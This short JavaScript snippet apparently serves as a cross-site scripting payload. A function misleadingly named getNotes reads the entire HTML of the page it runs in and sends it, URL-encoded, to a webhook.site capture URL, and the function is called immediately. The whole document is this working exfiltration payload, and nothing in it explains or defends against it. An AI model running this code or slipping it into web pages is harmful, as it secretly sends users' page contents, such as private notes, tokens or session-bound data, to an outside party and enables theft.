async function getNotes() {
  const html = document.documentElement.outerHTML;
  await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?dump=" + encodeURIComponent(html));
}
getNotes();
